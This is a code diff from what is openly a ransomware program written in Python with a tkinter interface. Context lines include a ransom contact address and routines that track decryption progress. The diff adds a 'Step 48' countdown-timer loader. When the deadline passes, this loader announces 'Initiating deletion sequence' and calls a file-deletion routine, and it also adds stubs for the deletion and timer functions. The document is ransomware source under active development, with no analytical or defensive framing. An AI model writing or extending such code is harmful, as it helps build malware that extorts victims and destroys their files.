@@ -895,10 +895,6 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         messagebox.showwarning("Decryption Incomplete",
                                f"Decryption completed for {decrypted_count} out of {total_files} files.")
 
-
-    def load_timer_state(self):
-        pass
-
     # Function to safely update the progress bar
     def safe_update_progress(self, value, maximum):
         self.after(0, lambda: self.update_progress_bar(value, maximum))
@@ -988,12 +984,53 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             self.log(f"Failed to decrypt: {file_path} | Error: {e}")
             return False
 
+    # Step 48: Function to Load the Timer State, or begin deletion or any error happen reset timer
+    def load_timer_state(self):
+        try:
+            # Open TIMER_STATE_FILE and read this content
+            with open(TIMER_STATE_FILE, 'r') as file:
+                state = file.read().strip()
+
+                # if a file has no content, actually countdown doesn't activate
+                if not state:
+                    self.timerLabel.config(text="No Active Countdown. ")
+                    self.closingTime = None
+
+                # else, this file has content
+                else:
+                    # Set closing time
+                    self.closingTime = datetime.fromtimestamp(float(state))
+
+                    # if closing time under now time mean Time is UP
+                    if datetime.now() >= self.closingTime:
+                        self.timerLabel.config(text="Time is UP")
+                        messagebox.showinfo("Notification",
+                                            "Time has expired. Initiating deletion sequence.")
+
+                        self.begin_deletion_sequence()
+
+                    # else, update the Countdown timer
+                    else:
+                        self.update_timer()
+
+        # if any exception occurs, reset the timer
+        except (FileNotFoundError, ValueError):
+            self.reset_timer()
 
 
     def delete_timer_and_machine_id_files(self):
         pass
 
     def delete_timer_state_file(self):
+        pass
+
+    def begin_deletion_sequence(self):
+        pass
+
+    def update_timer(self):
+        pass
+
+    def reset_timer(self):
         pass
 
 
